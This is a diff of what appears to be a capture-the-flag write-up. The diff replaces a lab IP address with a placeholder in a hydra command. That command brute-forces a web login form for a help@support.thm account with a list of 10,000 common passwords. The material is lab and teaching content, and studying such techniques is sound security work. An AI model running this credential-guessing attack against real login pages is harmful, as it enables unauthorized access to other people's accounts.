@@ -42,7 +42,7 @@ I first need to guess the email. I tried the one used as the placeholder "[help@
 This worked:
 
 ```
-hydra -l help@support.thm -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt 10.49.187.109 http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials" -t 10 -w 1 -f -V -o found.txt
+hydra -l help@support.thm -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt <ip> http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials" -t 10 -w 1 -f -V -o found.txt
 ```
 
 ![image.png](/assets/images/image-4.png)
